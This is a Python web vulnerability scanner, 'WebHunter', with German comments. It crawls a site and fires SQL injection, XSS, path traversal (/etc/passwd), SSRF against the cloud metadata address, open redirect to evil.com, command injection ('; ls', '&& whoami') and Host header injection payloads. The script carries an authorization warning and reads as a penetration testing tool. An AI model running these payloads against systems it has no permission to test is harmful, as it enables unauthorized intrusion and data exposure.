#!/usr/bin/env python3
"""
WebHunter - Advanced Web Vulnerability Scanner
Part of BlackOps Framework - NUR FÜR AUTORISIERTE TESTS!
"""

import argparse
import requests
import sys
import time
import re
import urllib.parse
import random
import json
from urllib.parse import urljoin, urlparse
from collections import deque
from datetime import datetime
from colorama import Fore, Style, init

# Optional: Playwright für Headless Browser
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

init(autoreset=True)

class WebHunter:
    def __init__(self, target_url, threads=10, delay=0.5, proxy=None, headless=False, output=None):
        self.target = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.threads = threads
        self.delay = delay
        self.proxy = proxy
        self.headless = headless and PLAYWRIGHT_AVAILABLE
        self.output_file = output
        self.visited = set()
        self.forms = []
        self.params = set()
        self.vulnerabilities = []
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Payloads
        self.sql_payloads = ["'", "\"", "1' OR '1'='1", "1' OR 1=1--", "1' WAITFOR DELAY '0:0:5'--"]
        self.xss_payloads = ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>"]
        self.lfi_payloads = ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd"]
        self.ssrf_payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost:80", "http://127.0.0.1:8080"]
        self.open_redirect_payloads = ["https://evil.com", "//evil.com", "/\\evil.com"]
        self.cmd_injection_payloads = ["; ls", "| dir", "&& whoami", "`id`"]
        
    def log_vuln(self, vuln_type, url, param, payload, evidence=""):
        entry = {
            "type": vuln_type,
            "url": url,
            "param": param,
            "payload": payload,
            "evidence": evidence[:200],
            "timestamp": datetime.now().isoformat()
        }
        self.vulnerabilities.append(entry)
        print(f"{Fore.RED}[!] {vuln_type} FOUND: {url} ({param})")
        print(f"{Fore.YELLOW}    Payload: {payload}")
        if evidence:
            print(f"{Fore.CYAN}    Evidence: {evidence[:100]}")
    
    def get_links(self, html, base_url):
        """Extrahiert alle Links aus HTML"""
        links = set()
        # einfaches Regex für href
        hrefs = re.findall(r'href=[\'"]?([^\'" >]+)', html)
        for href in hrefs:
            full = urljoin(base_url, href)
            if self.domain in full and full not in self.visited:
                links.add(full)
        return links
    
    def extract_forms(self, html, base_url):
        """Extrahiert Formulare mit Methode, Action und Inputs"""
        forms = []
        form_pattern = re.compile(r'<form.*?>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        for form_html in form_pattern.findall(html):
            # Methode
            method = re.search(r'method=[\'"]?(\w+)[\'"]?', form_html, re.I)
            method = method.group(1).upper() if method else "GET"
            # Action
            action = re.search(r'action=[\'"]?([^\'" >]+)[\'"]?', form_html, re.I)
            action_url = urljoin(base_url, action.group(1) if action else base_url)
            # Inputs
            inputs = re.findall(r'<input.*?name=[\'"]?([^\'" >]+)[\'"]?', form_html, re.I)
            forms.append({"method": method, "action": action_url, "inputs": inputs})
        return forms
    
    def test_sql_injection(self, url, param, value=None):
        """Testet auf SQLi durch boolesche und zeitbasierte Differenz"""
        # Normaler Request
        normal_params = {param: "1"}
        try:
            r1 = self.session.get(url, params=normal_params, timeout=5)
            normal_length = len(r1.text)
        except:
            return
        
        # Boolean test
        for payload in self.sql_payloads[:3]:
            test_params = {param: payload}
            try:
                r2 = self.session.get(url, params=test_params, timeout=5)
                if abs(len(r2.text) - normal_length) > 50 or "mysql" in r2.text.lower() or "sql" in r2.text.lower():
                    self.log_vuln("SQL Injection (Boolean)", url, param, payload, r2.text[:200])
                    return
            except:
                pass
        
        # Time-based (nur wenn keine schnellen Fehler)
        time_payload = "1' OR SLEEP(5)--"
        try:
            start = time.time()
            self.session.get(url, params={param: time_payload}, timeout=10)
            elapsed = time.time() - start
            if elapsed > 4:
                self.log_vuln("SQL Injection (Time-based)", url, param, time_payload, f"Delay: {elapsed:.2f}s")
        except:
            pass
    
    def test_xss(self, url, param, method="GET", data=None):
        """Testet auf reflektierte XSS"""
        for payload in self.xss_payloads:
            if method == "GET":
                test_params = {param: payload}
                try:
                    r = self.session.get(url, params=test_params, timeout=5)
                    if payload in r.text and ("<script>" in payload or "alert" in payload):
                        self.log_vuln("Reflected XSS", url, param, payload, r.text[:200])
                        return
                except:
                    pass
            else:  # POST
                if data:
                    test_data = data.copy()
                    test_data[param] = payload
                    try:
                        r = self.session.post(url, data=test_data, timeout=5)
                        if payload in r.text:
                            self.log_vuln("Stored/Reflected XSS (POST)", url, param, payload, r.text[:200])
                            return
                    except:
                        pass
    
    def test_lfi(self, url, param):
        """Testet auf Local File Inclusion / Directory Traversal"""
        for payload in self.lfi_payloads:
            test_params = {param: payload}
            try:
                r = self.session.get(url, params=test_params, timeout=5)
                if "root:" in r.text or "[extensions]" in r.text or "Windows Registry" in r.text:
                    self.log_vuln("LFI / Directory Traversal", url, param, payload, r.text[:200])
                    return
            except:
                pass
    
    def test_ssrf(self, url, param):
        """Testet auf Server-Side Request Forgery (interne Dienste)"""
        for payload in self.ssrf_payloads:
            test_params = {param: payload}
            try:
                r = self.session.get(url, params=test_params, timeout=5)
                if "169.254.169.254" in r.text or "localhost" in r.text or "root" in r.text:
                    self.log_vuln("SSRF", url, param, payload, r.text[:200])
                    return
            except:
                pass
    
    def test_open_redirect(self, url, param):
        """Testet auf Open Redirect"""
        for payload in self.open_redirect_payloads:
            test_params = {param: payload}
            try:
                r = self.session.get(url, params=test_params, allow_redirects=False, timeout=5)
                if r.status_code in [301, 302] and payload in r.headers.get('Location', ''):
                    self.log_vuln("Open Redirect", url, param, payload, r.headers.get('Location', ''))
                    return
            except:
                pass
    
    def test_command_injection(self, url, param):
        """Testet auf Command Injection (einfache Erkennung)"""
        for payload in self.cmd_injection_payloads:
            test_params = {param: payload}
            try:
                r = self.session.get(url, params=test_params, timeout=5)
                if "uid=" in r.text or "win.ini" in r.text or "root" in r.text:
                    self.log_vuln("Command Injection", url, param, payload, r.text[:200])
                    return
            except:
                pass
    
    def test_header_injection(self, url):
        """Testet Host Header Injection und X-Forwarded-For"""
        malicious_host = "evil.com"
        headers = {'Host': malicious_host, 'X-Forwarded-For': '127.0.0.1'}
        try:
            r = self.session.get(url, headers=headers, timeout=5)
            if malicious_host in r.text or "127.0.0.1" in r.text:
                self.log_vuln("Host Header Injection", url, "Host", malicious_host, r.text[:200])
        except:
            pass
    
    def crawl(self):
        """Crawlt die Webseite und sammelt URLs, Parameter, Formulare"""
        print(f"{Fore.CYAN}[*] Crawling {self.target} ...")
        queue = deque([self.target])
        self.visited.add(self.target)
        
        while queue:
            current = queue.popleft()
            print(f"{Fore.WHITE}[>] {current}")
            try:
                resp = self.session.get(current, timeout=5)
                html = resp.text
                # Extrahiere Links
                new_links = self.get_links(html, current)
                for link in new_links:
                    if link not in self.visited:
                        self.visited.add(link)
                        queue.append(link)
                # Extrahiere Formulare
                forms = self.extract_forms(html, current)
                self.forms.extend(forms)
                # Extrahiere GET-Parameter aus URL
                parsed = urlparse(current)
                if parsed.query:
                    params = urllib.parse.parse_qs(parsed.query)
                    for p in params.keys():
                        self.params.add((current, p, "GET"))
            except Exception as e:
                print(f"{Fore.RED}[!] Fehler beim Crawlen {current}: {e}")
            time.sleep(self.delay)
        
        print(f"{Fore.GREEN}[✓] Crawling abgeschlossen. {len(self.visited)} URLs, {len(self.forms)} Formulare, {len(self.params)} GET-Parameter.")
    
    def scan(self):
        """Führt alle Tests durch"""
        print(f"{Fore.CYAN}[*] Starte Sicherheitsscan...")
        # 1. GET-Parameter testen
        for url, param, method in self.params:
            print(f"{Fore.WHITE}[~] Teste {url} -> Parameter '{param}'")
            self.test_sql_injection(url, param)
            self.test_xss(url, param, method="GET")
            self.test_lfi(url, param)
            self.test_ssrf(url, param)
            self.test_open_redirect(url, param)
            self.test_command_injection(url, param)
            time.sleep(self.delay)
        
        # 2. Formulare testen (POST)
        for form in self.forms:
            action = form['action']
            method = form['method']
            inputs = form['inputs']
            print(f"{Fore.WHITE}[~] Teste Formular {action} (Method: {method})")
            for inp in inputs:
                if method == "GET":
                    self.test_xss(action, inp, method="GET")
                else:
                    # Für POST-XSS: sende Payload als Wert
                    for payload in self.xss_payloads:
                        data = {inp: payload}
                        try:
                            r = self.session.post(action, data=data, timeout=5)
                            if payload in r.text:
                                self.log_vuln("Stored XSS (POST)", action, inp, payload, r.text[:200])
                                break
                        except:
                            pass
            time.sleep(self.delay)
        
        # 3. Header Injection
        for url in self.visited:
            self.test_header_injection(url)
            time.sleep(self.delay)
        
        # 4. Ergebnis
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] {len(self.vulnerabilities)} Schwachstellen gefunden!")
            if self.output_file:
                with open(self.output_file, 'w') as f:
                    json.dump(self.vulnerabilities, f, indent=2)
                print(f"{Fore.GREEN}[✓] Bericht gespeichert: {self.output_file}")
        else:
            print(f"\n{Fore.GREEN}[✓] Keine Schwachstellen gefunden (basierend auf Payloads).")
    
    def run(self):
        self.crawl()
        self.scan()

def main():
    parser = argparse.ArgumentParser(description="WebHunter - Web Vulnerability Scanner")
    parser.add_argument("target", help="Ziel-URL (z.B. http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Anzahl Threads (Crawling)")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Verzögerung zwischen Requests")
    parser.add_argument("-p", "--proxy", help="HTTP-Proxy (z.B. http://127.0.0.1:8080)")
    parser.add_argument("--headless", action="store_true", help="Headless Browser für JS-Content (benötigt playwright)")
    parser.add_argument("-o", "--output", help="JSON-Datei für Ergebnisse")
    parser.add_argument("--no-banner", action="store_true", help="Kein Banner anzeigen")
    args = parser.parse_args()
    
    # Banner
    if not args.no_banner:
        print(rf"""{Fore.RED}
    __        __   __          __                   
   / /_____ _/ /  / /_  ____  / /_  ___  _____      
  / __/ __ `/ /  / __ \/ __ \/ __ \/ _ \/ ___/      
 / /_/ /_/ / /  / /_/ / / / / / / /  __/ /          
 \__/\__,_/_/  /_.___/_/ /_/_/ /_/\___/_/           
{Fore.WHITE}   >> WEB VULNERABILITY SCANNER v1.0 <<
{Fore.YELLOW}   NUR FÜR AUTORISIERTE SICHERHEITSTESTS!
        """)
    
    # Ethische Warnung
    print(f"{Fore.RED}[!] Verwendung nur auf eigenen Systemen oder mit schriftlicher Erlaubnis!")
    confirm = input(f"{Fore.WHITE}[?] Fortfahren? (ja/NEIN): ").strip().lower()
    if confirm != "ja":
        print("Abbruch.")
        sys.exit(0)
    
    scanner = WebHunter(args.target, args.threads, args.delay, args.proxy, args.headless, args.output)
    scanner.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan abgebrochen.")
        sys.exit(0)
